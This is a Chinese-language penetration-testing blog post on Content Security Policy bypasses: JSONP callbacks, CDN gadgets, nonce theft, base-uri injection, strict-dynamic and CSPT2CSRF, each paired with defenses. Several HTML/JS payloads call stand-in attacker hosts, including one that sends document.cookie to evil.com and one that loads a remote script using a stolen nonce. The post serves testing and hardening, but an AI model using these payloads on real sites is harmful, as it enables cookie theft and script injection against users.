---
title: CSP绕过策略
date: 2025-04-01 08:00:00
tags:
  - Web安全
  - 渗透测试
description: CSP绕过策略——渗透测试实战笔记，含完整攻击链路与防御方案。
categories: 渗透测试
---

## 前言

CSP（Content Security Policy）是浏览器内置的安全机制，通过 HTTP 响应头或 `<meta>` 标签告诉浏览器"哪些资源可以加载、哪些脚本可以执行"。正确配置的 CSP 能有效防御 XSS——但"正确配置"是关键词。现实中因为业务需求（第三方脚本、CDN、埋点）而放宽限制，攻击者正是利用这些"缝隙"绕过 CSP。

> **免责声明：** 本文所有技术仅供安全研究、授权测试与防御体系建设使用，禁止用于任何非法用途。因不当使用导致的后果由行为人自行承担。

---

## 一、CSP 策略结构速览

CSP 通过 **指令（directive）** 和 **源（source）** 定义资源白名单：

```
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com;
style-src 'self' 'unsafe-inline'; img-src *; connect-src 'self';
frame-src 'none'; base-uri 'self'; form-action 'self'
```

核心指令一览：

| 指令 | 作用 | 常见风险 |
|------|------|----------|
| `default-src` | 所有资源类型兜底策略 | 设为 `*` 等于没有 CSP |
| `script-src` | 控制可执行 JS 来源 | **攻击面最大**，本文重点 |
| `base-uri` | 控制 `<base>` 标签 | 未设置可导致 base-uri 注入 |
| `object-src` | 控制 `<object>`/`<embed>` | 应始终设为 `'none'` |
| `form-action` | 控制表单提交目标 | 未限制可被用于钓鱼 |
| `frame-src` | 控制 iframe 嵌套来源 | 宽松可致点击劫持 |
| `connect-src` | 控制 XHR/WebSocket/fetch | 限制 C2 通道 |

CSP 可通过 HTTP 响应头（推荐）或 `<meta>` 标签（功能受限）部署。

---

## 二、script-src 白名单绕过

`script-src` 是最难配置完美的指令。一旦白名单中存在可利用的域名，CSP 就可能被击穿。

### 2.1 JSONP 劫持

JSONP 端点天然允许任意回调函数名，如果其域名在 `script-src` 白名单中，攻击者可直接注入代码：

```html
<!-- CSP 白名单包含 cdn.example.com，且其上存在 JSONP 端点 -->
<script src="https://cdn.example.com/jsonp/userinfo?callback=alert(document.domain)"></script>

<!-- 利用 JSONP 外带数据 -->
<script src="https://cdn.example.com/api?callback=fetch('https://evil.com/?'+document.cookie)"></script>
```

**防御：** 白名单不应包含 JSONP 端点域名；若必须列入，确保对 callback 参数做白名单校验。

### 2.2 CDN Gadget 利用

公共 CDN（cdnjs、jsDelivr、unpkg）上托管着海量第三方包，某些库自身具备代码执行能力（"Gadget"），可被攻击者利用：

```html
<!-- cdnjs.cloudflare.com 在白名单中，Angular 1.6.1 沙箱逃逸 -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
<div ng-app ng-csp>
  <div ng-click="$event.view.alert(1)">Click me</div>
</div>

<!-- RequireJS data-main 加载任意脚本 -->
<script src="https://cdn.jsdelivr.net/npm/requirejs@2.3.6/require.js"
  data-main="https://evil.com/payload.js"></script>
```

### 2.3 域名白名单的长尾风险

`*.example.com`（过期子域名接管）、`*.cloudfront.net` / `*.s3.amazonaws.com`（公开 bucket 上传）、`*.googleapis.com`（JSONP 端点）。任何一个被攻破都可能导致 CSP 形同虚设。

### 2.4 绕过决策流程图

```
注入点被发现
    │
    ▼
检查 script-src 白名单
    │
    ├── 包含 JSONP 端点？ ──→ callback=payload → 绕过
    ├── 包含 CDN (cdnjs/unpkg)？ ──→ 寻找代码执行 Gadget
    ├── 包含通配符域名？ ──→ 检查子域名接管
    ├── 包含云存储域名？ ──→ 上传恶意 JS
    ├── 包含 'unsafe-inline'？ ──→ 直接注入 <script> / onerror
    └── 以上皆否 ──→ 尝试 nonce 窃取 / base-uri 注入
```

---

## 三、Nonce 窃取

CSP nonce 机制：服务端每次响应生成随机 nonce，浏览器只执行 nonce 匹配的脚本。

```html
<!-- 响应头 -->
Content-Security-Policy: script-src 'nonce-r4nd0m123'

<!-- 合法脚本 -->
<script nonce="r4nd0m123">/* 合法业务代码 */</script>

<!-- 攻击者注入的 inline script — 没有 nonce，不执行 -->
<script>alert(1)</script>
```

### 3.1 窃取条件与手法

Nonce 被窃取的前提：页面存在 DOM XSS、nonce 可预测（时间戳/递增数字）或跨页面复用。

当页面通过 `innerHTML` 将用户输入插入 DOM 时，虽然 `<script>` 标签不会执行，但事件处理器仍可读取 nonce：

```html
<!-- 攻击者 payload —— 从 DOM 中读取 nonce 并用于创建被信任的脚本 -->
<svg onload="
  var s = document.createElement('script');
  s.nonce = document.querySelector('script[nonce]').nonce;
  s.src = 'https://evil.com/steal.js';
  document.head.appendChild(s);
">
```

**关键点：** `<script nonce="...">` 标签的 nonce 属性是 DOM 的一部分，任何 JS 都可读取——nonce 对外不可见但对内可见。

### 3.2 防御

使用 `strict-dynamic` 减少 nonce 依赖；杜绝 DOM XSS；Nonce 每次请求用密码学安全随机数生成。

---

## 四、Base-uri 注入

`base-uri` 是指制 `<base>` 标签的指令，常被忽略但极其危险。

### 4.1 攻击原理

当 CSP 未设置 `base-uri`（或设为 `*`），攻击者可注入 `<base>` 标签改变相对路径解析基准：

```html
<!-- 攻击者注入 -->
<base href="https://evil.com/">

<!-- 页面中的相对路径脚本 -->
<script src="js/app.js"></script>
<!-- 实际加载 https://evil.com/js/app.js -->
```

### 4.2 完整攻击链

```
目标页面：https://victim.com/page?name=test
CSP: script-src 'self' cdn.example.com   ← 未设置 base-uri
攻击注入：?name=<base href="https://attacker.com/">
页面原始：<script src="/assets/jquery.js"></script>
实际请求：https://attacker.com/assets/jquery.js  ← 攻击者控服
```

只要 `attacker.com` 命中 script-src 白名单，CSP 就不再阻止。

### 4.3 防御

**永远设置 `base-uri 'self'` 或 `base-uri 'none'`**——这应该是每个 CSP 的必填项。

---

## 五、strict-dynamic 绕过

`strict-dynamic` 是 CSP Level 3 特性：被 nonce/hash 信任的脚本动态创建的 `<script>` 自动被信任，无需匹配白名单。

```
Content-Security-Policy: script-src 'strict-dynamic' 'nonce-r4nd0m123'
```

### 5.1 信任传递链

```html
<script nonce="r4nd0m123">
  var s = document.createElement('script');
  s.src = 'https://cdn.example.com/library.js';  // 自动信任，不在白名单也能加载
  document.head.appendChild(s);
</script>
```

### 5.2 攻击面

`strict-dynamic` 本身不是漏洞，但会放大 DOM XSS 危害——一旦在被信任的脚本中找到注入点，攻击者可通过动态创建 `<script>` 加载任意外部恶意脚本，**不再受白名单约束**：

```javascript
// 被 nonce 信任的脚本中存在注入点
var redirectUrl = getUserInput();  // ← 用户可控

// 攻击者控制 redirectUrl 后：
var s = document.createElement('script');
s.src = 'https://evil.com/payload.js';  // strict-dynamic 直接放行
document.head.appendChild(s);
```

### 5.3 常见错误配置

```
# 错误 —— strict-dynamic 没有 nonce/hash 锚点，等于没写
Content-Security-Policy: script-src 'strict-dynamic' cdn.example.com

# 正确 —— 至少有一个信任锚
Content-Security-Policy: script-src 'strict-dynamic' 'nonce-abc123' cdn.example.com
```

**注意：** 当 `strict-dynamic` 生效时，`'unsafe-inline'` 和 `http:`/`https:` scheme 会被忽略。但静态 `<script src="...">` 仍然会被域名白名单检查。

---

## 六、CSPT2CSRF 技术

**CSPT（Client-Side Path Traversal）** 是指前端 JS 根据用户输入拼接请求路径时产生的路径遍历漏洞。**CSPT2CSRF** 则是利用 CSPT 构造 CSRF 攻击链。

### 6.1 CSPT 原理

```javascript
// 前端代码 —— user ID 取自 URL hash，拼入 API 路径
var userId = location.hash.slice(1);
fetch('/api/users/' + userId + '/profile')
  .then(r => r.json())
  .then(data => { /* 渲染到页面 */ });
```

攻击者构造 URL：`https://victim.com/page#../admin/deleteAccount`

实际请求变为：`GET /api/users/../admin/deleteAccount/profile` → `GET /api/admin/deleteAccount/profile`

### 6.2 升级为 CSRF

当 API 使用 Cookie 鉴权（SameSite=None），攻击者可跨域触发：

```html
<script>
  window.open('https://victim.com/page#../admin/deleteAccount');
</script>
<img src="https://victim.com/api/admin/deleteAccount">
```

### 6.3 防御

前端过滤 `..`、`/`、`\`；后端做权限校验；API 使用 CSRF Token；Cookie 设 `SameSite=Lax`。

---

## 七、CSP Evaluator 自动化检测

手动审查 CSP 容易遗漏。Google 的 **CSP Evaluator**（csp-evaluator.withgoogle.com）是审核 CSP 策略的首选工具。直接粘贴 CSP 头，工具自动给出逐条警告：

| 级别 | 问题 | 原因 |
|------|------|------|
| 🔴 高危 | `script-src 'unsafe-inline'` | 允许内联脚本，XSS 直通 |
| 🟡 中危 | `script-src cdn.example.com` | 白名单域名可能有 JSONP / Gadget |
| 🟡 中危 | 缺少 `base-uri` | 可注入 `<base>` 劫持路径 |
| 🔴 高危 | `object-src` 不为 `'none'` | 插件攻击面 |

渗透测试的 CSP 分析流程：提取 CSP → 输入 CSP Evaluator → 标记高危项 → 逐条检查白名单域名（JSONP 列表、云存储、可接管子域名）→ 检查缺失指令（`base-uri`、`object-src`）→ 检查 nonce 可预测性 → 构造 payload 验证绕过。

---

## 八、常见配置错误与避坑指南

### 8.1 default-src 过宽

```
# 错误 —— 等同于无 CSP
Content-Security-Policy: default-src *

# 正确 —— 先收紧默认，再逐条放开
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xxx'
```

### 8.2 report-uri 不是防御

```
# report-uri 只报告违规，不阻止执行
# 攻击者 payload 照常执行——report 只是事后日志
Content-Security-Policy: script-src 'self'; report-uri /csp-report
```

### 8.3 忘记限制 object-src

```
# 即使业务不需要 Flash/插件，object-src 默认继承 default-src
# 始终显式设为 'none'
Content-Security-Policy: object-src 'none'
```

### 8.4 script-src-elem 与 script-src-attr 的覆盖陷阱

CSP Level 3 拆分了 `script-src`：`script-src-elem`（`<script>` 标签）和 `script-src-attr`（事件处理器）。后者会覆盖前者对事件处理器的限制：

```
# script-src 禁止了 unsafe-inline，但 script-src-attr 放开了
Content-Security-Policy: script-src 'self'; script-src-attr 'unsafe-inline'

# 结果：<button onclick="alert(1)"> 仍可执行！
```

### 8.5 同时使用 CSP 和 X-XSS-Protection

`X-XSS-Protection: 1; mode=block` 已被现代浏览器弃用，可能干扰 CSP 行为——直接去掉。

---

## 九、总结

CSP 绕过不是寻找万能 payload，而是**分析每个白名单条目和每个缺失指令的攻击面**：

| 绕过手法 | 前提条件 | 核心思路 |
|----------|----------|----------|
| JSONP 劫持 | 白名单中存在 JSONP 端点 | callback 参数注入代码 |
| CDN Gadget | 白名单包含公共 CDN | 利用已有库的代码执行能力 |
| 子域名接管 | 白名单包含通配符域名 | 接管过期子域名托管 payload |
| Nonce 窃取 | 页面存在 DOM XSS | 读取 DOM 中 nonce 创建被信任脚本 |
| Base-uri 注入 | CSP 未设置 base-uri | `<base>` 劫持相对路径加载 |
| strict-dynamic 利用 | 被 nonce 信任的脚本有注入点 | 动态创建 `<script>` 绕过白名单 |
| CSPT2CSRF | 前端路径拼接 + Cookie 认证 | 路径遍历构造 CSRF 请求 |

**推荐的最坚固 CSP 配置：**

```
Content-Security-Policy:
  default-src 'self';
  script-src 'strict-dynamic' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  img-src *; connect-src 'self';
  frame-src 'none'; base-uri 'none';
  form-action 'self'; object-src 'none';
  report-uri /csp-violation-report
```

没有 `unsafe-inline`、没有 `unsafe-eval`、没有宽松的域名白名单——但即使这样，DOM XSS 结合 `strict-dynamic` 的信任传递仍是残留风险。CSP 是纵深防御的一环，不能替代输入过滤和输出编码。

---

> **再次声明：** 本文技术仅用于合法的安全测试与自有系统的防护加固。未获书面授权对任何系统实施本文所述攻击技术均属违法行为。安全研究者应在授权范围内测试，并遵循负责任的漏洞披露流程。
